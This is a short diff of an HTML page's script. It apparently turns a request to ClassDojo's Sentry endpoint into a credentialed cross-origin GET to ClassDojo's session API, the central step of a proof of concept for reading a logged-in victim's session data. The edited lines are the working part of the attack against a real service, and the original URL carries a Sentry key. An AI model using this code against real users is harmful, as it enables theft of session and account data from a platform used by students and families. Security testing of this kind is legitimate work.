@@ -10,7 +10,7 @@
     <script>
         var req = new XMLHttpRequest(); 
         req.onload = reqListener; 
-        req.open('POST', 'https://sentry.classdojo.com/api/6/envelope/?sentry_key=5c51355865402090ed03d41319214223&sentry_version=7&sentry_client=sentry.javascript.react%2F7.118.0', true); 
+        req.open('GET', 'https://home.classdojo.com/api/session?duration=long', true); 
         req.withCredentials = true; // Send cookies with the request
         req.send();
 
